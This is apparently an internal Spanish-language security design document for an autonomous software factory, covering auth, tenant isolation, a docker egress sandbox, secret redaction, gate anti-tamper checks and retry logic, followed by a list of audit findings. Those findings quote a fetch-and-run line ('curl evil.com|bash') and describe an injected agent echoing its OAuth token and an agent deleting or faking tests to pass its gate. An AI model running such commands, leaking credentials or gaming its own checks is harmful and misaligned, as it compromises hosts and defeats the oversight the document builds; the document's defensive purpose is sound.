# Seguridad, multi-tenant y resiliencia

Esta página documenta el **piso de seguridad** de aiuda-forge (la fábrica de
software autónoma): cómo se autentica el plano de control, cómo se aísla cada
proyecto (multi-tenant), cómo se contiene el código no confiable que la fábrica
clona y ejecuta, cómo el gate se vuelve un control de integridad anti-tamper, y
qué mecanismos de resiliencia (R1 reintento de transitorios, R2 reencolar un
sprint) evitan perder trabajo ante fallos del proveedor.

El contexto es importante: aiuda-forge **clona repositorios arbitrarios, ejecuta
su código, y puede auto-mergear PRs**. Esto convierte casi todo en superficie de
ataque. La auditoría adversarial previa
(`docs/AUDIT-2026-06-25.md`) lo resume sin anestesia: "el camino feliz es sólido;
los defectos se concentran en seguridad de repos no confiables y en el modelo
single-tenant". Las olas de remediación Wave 0 (piso de seguridad) y Wave 4
(multi-tenant) son lo que aquí se documenta como ya implementado.

---

## 1. Modelo de autenticación (auth local)

El plano de control no delega en ningún IdP externo: la auth es **local**, con
usuarios email+password y tokens de sesión opacos persistidos en SQLite
(`engine/internal/auth/auth.go`).

- **Passwords con bcrypt.** `CreateUser` hashea con `bcrypt.DefaultCost`
  (`auth.go:118`); el texto plano nunca se almacena ni se loguea. El campo
  `hash` del struct `User` es **no exportado** (`auth.go:40`) precisamente para
  que no se filtre vía JSON.
- **Comparación de tiempo constante y defensa contra enumeración de usuarios.**
  `Authenticate` (`auth.go:143-162`) usa `bcrypt.CompareHashAndPassword`
  (tiempo constante). Si el usuario no existe, **igual** corre un bcrypt contra
  un `dummyHash` fijo (`auth.go:148, 166`) para igualar el tiempo de respuesta —
  un atacante no puede distinguir "email inexistente" de "password incorrecto"
  por timing.
- **Tokens de sesión opacos.** `randomToken` produce 32 bytes aleatorios en hex
  (64 chars, `auth.go:250-256`): no adivinables, alta entropía. Es el credencial
  bearer que la consola envía como `Authorization: Bearer <token>`. TTL de 7
  días (`SessionTTL`, `auth.go:34`); las sesiones expiradas se borran de forma
  oportunista en `UserForToken` (`auth.go:205-208`).
- **Email normalizado.** `normalizeEmail` (`auth.go:98`) hace lower-case + trim,
  de modo que la restricción `UNIQUE` no se evade cambiando el casing.
- **DSN endurecido.** `Open` usa `_txlock=immediate`, `busy_timeout(10000)`,
  `journal_mode(WAL)`, `foreign_keys(1)` y `SetMaxOpenConns(1)`
  (`auth.go:77-89`) — el mismo patrón single-writer que el kernel store.

### Seed del primer admin

`SeedAdmin` (`engine/internal/auth/seed.go`) crea el **primer** admin desde
`VIBEFORGE_ADMIN_EMAIL` + `VIBEFORGE_ADMIN_PASSWORD` **solo si la tabla de
usuarios está vacía** (`seed.go:19-26`). Es idempotente entre reinicios y nunca
loguea la password (`seed.go:31`).

### Middleware de auth obligatoria (mandatory session-or-service-token)

El middleware vive en `engine/internal/httpx/auth.go` y resuelve la respuesta a
la auditoría **C1** (control-plane sin auth + CORS `*` = "llave maestra CSRF").

- Una petición se acepta **si y solo si** trae **o** un token de sesión válido
  **o** el `VIBEFORGE_API_TOKEN` exacto (`Auth` → `authorize`, `auth.go:78-127`).
- El service token se compara con **tiempo constante** (`subtle.ConstantTimeCompare`,
  `auth.go:117`) para que un token equivocado no se pueda timear.
- **Todo es privado por defecto**, incluidas las lecturas `GET`. Solo
  `publicPath` (`auth.go:57-65`) exime `/healthz`, `/readyz` y `POST /auth/login`.
  Esto cierra la auditoría **C4** (las lecturas no autenticadas filtraban
  secretos vía `GET /runs/{id}/events`).
- El upgrade de WebSocket (`/ws`) acepta el token por query param porque los
  navegadores no pueden poner el header `Authorization` en un WS — pero el token
  se valida idénticamente (`auth.go:108-112`).
- Auth va **dentro** del wrapper CORS, de modo que CORS responde el `OPTIONS`
  preflight antes de que Auth corra (`auth.go:75-77`).

### Modo abierto = solo loopback

Cuando **no** hay service token **ni** usuarios, el middleware es un pass-through
transparente (`Enabled()==false`, `auth.go:50-52`). En ese caso el plano de
control (`engine/cmd/control/main.go`) **reescribe la dirección de bind a
127.0.0.1** y loguea ruidosamente (`loopbackAddr(addr)`): nunca sirve abierto al
mundo. Cuando hay token o ≥1 usuario, auth queda `ENABLED` y CORS refleja un
único origen con credenciales (jamás `*`).

---

## 2. Aislamiento por proyecto (multi-tenant)

El modelo de datos original era **single-tenant**: no había `project_id` (auditoría
**A1/A2**). La Wave 4 introdujo el scoping por proyecto:

- **`project_id` en runs/tasks/events** (`engine/internal/store/store.go:42,64,77`)
  y en **stories/sprints** (`engine/internal/tickets/tickets.go:139,154`). Las
  migraciones son aditivas (`ALTER TABLE ... ADD COLUMN project_id`,
  `store.go:89-91`, `tickets.go:179-180`) e idempotentes.
- **Backfill a `DefaultProjectID="default"`.** Las filas pre-migración se sellan
  con el proyecto `default` (`store.go:130-138`, `tickets.go:228`), cuyo dueño es
  `owner_id=""`, para que los datos single-tenant heredados sigan funcionando.
- **`/projects` está scopeado por dueño.** El handler `createProject` toma el
  `owner_id` del usuario autenticado vía `httpx.UserIDFromContext`
  (`engine/internal/api/projects.go:91-102`), y `listProjects` usa
  `ListByOwner(ownerID)` cuando hay usuario (`projects.go:123-129` →
  `engine/internal/projects/projects.go:195-198`). Un usuario solo ve **sus**
  proyectos.
- **El user-id viaja por contexto.** El middleware deja el id resuelto en el
  request con `WithUserID`, y los handlers owner-scoped lo leen con
  `UserIDFromContext` (`engine/internal/httpx/auth.go:16-26`). El service token
  autoriza con `userID==""` (sin identidad por-usuario).

> ⚠️ El scoping de runs/tickets/events es **parcial** — ver Hallazgos de
> validación. `project_id` existe y `?project=` filtra, pero la propiedad del
> proyecto **no se verifica** contra el usuario autenticado en esas rutas.

---

## 3. Piso de sandbox / egress, y por qué design corre en host y factory en docker

### El sandbox como frontera real

El agente y el gate ejecutan **código de repos no confiables**. La frontera es
docker sobre una **red de egress con allowlist** (`engine/internal/sandbox`):

- **Red `vibeforge-egress`** (`DefaultEgressNetwork`, `sandbox.go:79`): sin
  gateway a internet; la única salida es el egress-proxy (allowlist, default-deny).
  No es `none` (el agente necesita la API del LLM) ni el `bridge` abierto.
- **Hard-fail si no hay docker (auditoría C2/C2b).** `Config.RequireDocker`
  (`sandbox.go:49-54`) + `MustDocker` (`sandbox.go:57-66`): si la isolation real
  no está disponible, el step **FALLA** en lugar de degradar silenciosamente a
  `LocalSandbox` corriendo el código en el host con las credenciales del operador
  y sin proxy de egress. El runner del agente lo invoca explícitamente
  (`engine/internal/agent/runner.go:124-126`): `cfg.MustDocker(sb)` aborta el
  step. La variable de entorno que enciende esto es **`VIBEFORGE_REQUIRE_SANDBOX`**
  (mapeada a `RequireDocker` en el control plane).
- `LocalSandbox` se etiqueta honestamente como **"NOT a security boundary"**
  (`sandbox.go:7,202-206`) y solo se permite en dev/test explícito.

### Redacción de env hacia el contenedor

`engine/internal/agent/egress.go` construye el env que entra al contenedor con un
**allowlist positivo** (`EgressEnv` agrega solo lo necesario) más un guard de
"belt-and-suspenders":

- `forbiddenInSandbox` (`egress.go:18-25`) lista las vars que **NUNCA** deben
  llegar al contenedor: `GH_TOKEN`, `VIBEFORGE_DAEMON_SECRET`,
  `AWS_SECRET_ACCESS_KEY`, `DB_PASSWORD`, `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`.
- **Modo api_key (estricto):** el contenedor solo ve un **sentinel no-secreto**
  (`SandboxSentinelAPIKey`, `egress.go:13,66`); el egress-proxy inyecta la clave
  real (que vive **fuera** del sandbox). Exposición cero del token real.
- **Modo subscription/oauth (passthrough):** se inyecta `CLAUDE_CODE_OAUTH_TOKEN`
  y el agente habla con `api.anthropic.com` — pero **siempre a través** del proxy
  de allowlist (`HTTPS_PROXY`/`HTTP_PROXY` salvo `Open`, `egress.go:72-76`).
- `MergeAllowed` (`egress.go:87-96`) descarta cualquier key prohibida al mezclar
  vars de tarea — la puerta segura si algún día el agente recibe env arbitrario.
- Aun el fallback local scrub el env (`localAgentEnv`, `egress.go:102-113`): jamás
  filtra `GH_TOKEN`/`DB_*` ni siquiera en host.

### Por qué design corre en host y factory en docker

El sistema distingue dos clases de step:

- **Steps de "factory" (implementación + gate)** corren **código de repo no
  confiable**: clonan, compilan, ejecutan tests. Estos **deben** ir en docker con
  egress allowlist y `MustDocker` activo. El agente trabaja sobre una copia
  **sin `.git`** del worktree (`CopyTreeNoGit`, `runner.go:90`) y sus ediciones
  se sincronizan de vuelta (`SyncBack`); el agente nunca toca `.git` ni el remoto.
- **Steps de "design"** (generar PRD, schema, specs) no ejecutan código no
  confiable: son agentes produciendo documentos. No hay un repo hostil que correr,
  así que el costo y la fricción de docker no se justifican y pueden correr en el
  host. La frontera docker se reserva para donde hay **ejecución** de código ajeno.

---

## 4. El gate como control de integridad (anti-tamper)

`engine/internal/gate/gate.go` convierte el gate en un **control de seguridad**:
el agente no puede debilitar su propio criterio de aprobación.

- **ANTI-TAMPER por sellado.** Antes de que el agente corra, el archivo de gate
  `.vibeforge-gate` se hashea (SHA-256) y se **sella** en un path del lado del
  daemon (`metaRoot`), **fuera del alcance del agente** (`Seal`, `gate.go:90-98`,
  archivo `0600`). En la verificación, `CheckIntegrity` (`gate.go:114-123`)
  compara el hash actual contra el sellado: si difieren, `ErrTampered`
  (`gate.go:29`) y `Passed=false` aunque el comando hubiera salido 0
  (`Run`, `gate.go:137-149`).
- **SUITE-INTEGRITY.** Se cuentan los marcadores de test antes y después
  (`countTestMarkers`, `gate.go:68-88`); si el conteo **baja** (el agente borró
  tests para ponerse en verde), `ErrSuiteShrank` (`gate.go:31,119-121`).
- Es **kernel code, no markdown** — checks deterministas, críticos de seguridad.
  El sello solo frena al *agente*; un gate **nacido malicioso** se sella tal cual
  (ver Hallazgos de validación, auditoría C2).

---

## 5. Redacción del live-log (logs)

Cada `step.event` (input de tool / texto del asistente) se persiste y se sirve por
`GET /runs/{id}/events`. Un agente con prompt-injection que corra
`echo $CLAUDE_CODE_OAUTH_TOKEN` aterrizaría el token real en el event store
(auditoría **C4**). `engine/internal/agent/redact.go` lo evita **antes** de
persistir la fila:

- **Patrones por forma de token** (`tokenPatterns`, `redact.go:23-30`): claves
  Anthropic `sk-ant-…`, GitHub `ghp_`/`gho_`/`github_pat_`, AWS `AKIA…`, y
  `Authorization: Bearer …`. Cada patrón captura todo el secreto, no solo el
  prefijo.
- **Secretos exactos registrados** en startup (`RegisterSecret`,
  `redact.go:43-60`): el token de agent_auth y `VIBEFORGE_API_TOKEN`. Se ordenan
  longest-first para que un secreto prefijo de otro se enmascare bien. Valores <8
  chars se ignoran (no sobre-redactar).
- `redactSecrets` (`redact.go:65-84`) reemplaza por el marcador `«redacted»`; es
  alloc-light en el caso común (sin secreto, short-circuit).

Defensa adicional: `GET /runs/{id}/events` ahora **requiere auth** (sección 1),
así que la redacción es defensa en profundidad, no la única barrera.

---

## 6. Resiliencia: R1 (límite como transitorio) y R2 (reencolar el sprint)

### R1 — Reintento de transitorios ante límites del proveedor

Un límite de sesión / rate-limit del proveedor **no es un defecto del trabajo**:
es transitorio y se resuelve solo. La cadena R1:

1. **Detección.** `isTransientErr` (`engine/internal/agent/runner.go:257-268`)
   reconoce marcadores: `session limit`, `rate limit`, `rate_limit`, `429`,
   `overloaded`, `529`, `usage limit` (`transientMarkers`, `runner.go:245-253`).
   Si la corrida del backend falla con uno de estos, el runner devuelve
   `StepResult{Retry: true}` en vez de `Success: false` (`runner.go:141-144`).
2. **Backoff.** El engine convierte ese `Retry` en un requeue diferido:
   `requeueTransient` (`engine/internal/workflow/engine.go:195-206`) calcula
   `available_at = now + transientBackoff` (5 min, `engine.go:193`) y llama
   `Store.RequeueTransient`.
3. **Requeue fenced y diferido.** `RequeueTransient`
   (`engine/internal/store/claim.go:268-296`) hace `RUNNING→QUEUED`, rota el
   **fence** (para que el reporte tardío del worker actual falle el fence-check),
   limpia `claimed_by`/`heartbeat_at`, y setea `available_at`. Si el fence no
   coincide, `ErrStaleFence` (no-op).
4. **Gate de re-claim.** `Claim` (`claim.go:19-28`) filtra
   `WHERE status='QUEUED' AND available_at <= now`: el step requeueado **no es
   re-reclamable** hasta que pase su backoff. Cuando el límite se levanta, un
   worker lo re-reclama y re-corre.

### R2 — Reencolar un sprint fallido

R2 es la acción dirigida por el usuario ("Reencolar"): resucita stories en estado
terminal (failed) de vuelta a `backlog` para que el orquestador re-dispare.

- **`RequeueSprint`** (`engine/internal/tickets/tickets.go:577-585`):
  `UPDATE stories SET status='backlog', run_id='', pr_url='' WHERE sprint_id=? AND
  status='failed'`. Cruza deliberadamente la arista `failed→backlog` que la
  máquina de estados automática prohíbe, y limpia `run_id`/`pr_url` para que el
  próximo disparo sea limpio.
- **`RequeueByRun`** (`tickets.go:592-633`): como en goal-mode todas las stories
  de un sprint comparten `run_id`, resuelve el sprint de cada story y reencola el
  **sprint completo**; las stories sueltas (sin `sprint_id`) se reencolan
  individualmente por `run_id`.
- **Endpoints** (`engine/internal/api/server.go`):
  `POST /runs/{id}/requeue` → `requeueRun` → `RequeueByRun` (server.go:64,248-255)
  y `POST /sprints/{id}/requeue` → `requeueSprint` → `RequeueSprint`
  (server.go:131,259-266). Ambos devuelven `{"requeued": n}`.

Nota de contraste: R1 es **automático y fenced** (no pierde trabajo ante un
hipo del proveedor); R2 es **manual** y cruza a propósito una arista de estado que
el state machine normal bloquea — es la palanca de recuperación del operador
cuando un sprint quedó en failed.

---

## Hallazgos de validación

Revisión adversarial sobre el código real. `file:line` para cada hallazgo.

- **Hueco de scoping multi-tenant en runs/tickets/events (cross-tenant read).**
  `engine/internal/api/server.go:180-193` (`listRuns`) toma `?project=<id>` como
  **query param sin verificar la propiedad** contra `UserIDFromContext`. Cualquier
  usuario autenticado puede listar los runs de **otro** proyecto pasando su id.
  Peor: `getRun` (`server.go:202-214`) **no tiene ningún scoping** — `GetRun(id)`
  + `TasksForRun(id)` se sirven a cualquier sesión válida. Solo `/projects` está
  owner-scopeado (`api/projects.go:123-129`). La auditoría A1 se cerró en el
  **modelo de datos** (existe `project_id`) pero **no en el plano de
  autorización** de las rutas de lectura. Lo mismo aplica a `events`/`tickets`.

- **Run-durability: `DeleteRun` es un hard-delete sin retención ni rastro.**
  `engine/internal/store/control.go:37-59` borra físicamente `events`, `tasks` y
  `runs` del run. Un run terminal **desaparece** de la kernel DB: no queda audit
  trail, y cualquier story que aún apunte a ese `run_id` queda **colgada** (su
  reconcile loop no encuentra el run). No hay soft-delete ni columna `deleted_at`.
  Esto, combinado con la falta de GC de workdirs/eventos señalada en la auditoría
  (A3, `docs/AUDIT-2026-06-25.md`), es la cara "durabilidad" del problema:
  los runs terminales o se acumulan sin límite, o se borran sin rastro.

- **R3 (desync story/run en recuperación interna) sigue PENDIENTE.** La
  recuperación B4 existe para stories `running` con `run_id==""`
  (`engine/internal/orchestrator/native_test.go:1027-1070`), pero **no hay**
  reconciliación para el caso inverso: una story que apunta a un `run_id` cuyo run
  fue **borrado** (DeleteRun) o quedó en un terminal que la story nunca observó.
  No existe `R3`/`reconcileStoryRunDesync` en el orquestador
  (grep en `engine/internal/orchestrator/*.go` no encuentra nada). La story queda
  en `running`/`in_review` indefinidamente. Pendiente declarado.

- **Falta cambio de password (no password-change / no rotación).** El store de
  auth (`engine/internal/auth/auth.go`) expone `CreateUser`, `Authenticate`,
  `DeleteSession`, pero **no** hay `ChangePassword` ni `UpdatePassword` ni endpoint
  asociado (grep no encuentra ninguno). Un admin sembrado con
  `VIBEFORGE_ADMIN_PASSWORD` **no puede rotar su clave** sin tocar la DB a mano.
  Tampoco hay invalidación masiva de sesiones tras un compromiso.

- **Gate "nacido malicioso" sigue siendo RCE (auditoría C2, residual).** El sello
  (`gate/gate.go:90-98`) solo impide que el *agente* debilite el gate **después**
  de sellar. Un repo cuyo `.vibeforge-gate` ya contiene `curl evil.com|bash` se
  sella **tal cual** y luego se ejecuta (`gate.go:151`). La mitigación real es
  `MustDocker` (corre en contenedor con egress allowlist), **no** el anti-tamper.
  Si `VIBEFORGE_REQUIRE_SANDBOX` no está seteado en un deploy, esto vuelve a ser
  RCE en host.

- **Suite-integrity defeatable y flaky (auditoría M2).** `countTestMarkers`
  (`gate/gate.go:68-88`) es un grep de contenido: cuenta `func Test`/`def test_`/
  `it(`/`test(` por todo el árbol. Un agente puede **inflar** el conteo agregando
  strings `def test_` en cualquier archivo (lo derrota), y regenerar una dep
  vendoreada puede **bajar** el conteo y disparar `ErrSuiteShrank` falsamente.
  Solo salta `.git` y `node_modules` (`gate.go:75`), no `.venv` ni comentarios.

- **TODO: imágenes de sandbox por-lane.** `engine/internal/agent/runner.go:50-52`
  documenta explícitamente que **toda lane comparte la imagen global** del control
  (`r.SandboxTemplate`); la imagen por-lane es un concern de "Phase B2" no
  implementado. Hoy una lane flutter no tiene el Flutter SDK en su contenedor —
  riesgo de que el gate de esa lane corra en un entorno sin sus toolchains, o de
  que se relaje a `Open`/local para compensar.

- **`available_at` confía en el reloj del store (R1).** El backoff de R1
  (`engine/internal/workflow/engine.go:199`, `store/claim.go:28`) se compara
  contra `s.now()`. Un salto de reloj hacia atrás (NTP, contenedor pausado) puede
  retrasar indefinidamente el re-claim de un step transitorio; un salto hacia
  adelante lo libera antes. No hay clamp ni jitter.

- **Token oauth/subscription cruza al sandbox en claro (auditoría M8, residual).**
  En modo subscription, `CLAUDE_CODE_OAUTH_TOKEN` se inyecta directo al contenedor
  (`engine/internal/agent/egress.go:67-70`); solo el modo `api_key` usa el patrón
  sentinel+proxy. El token sigue siendo exfiltrable por el egress permitido
  (anthropic/pypi/npm) si el agente está comprometido.
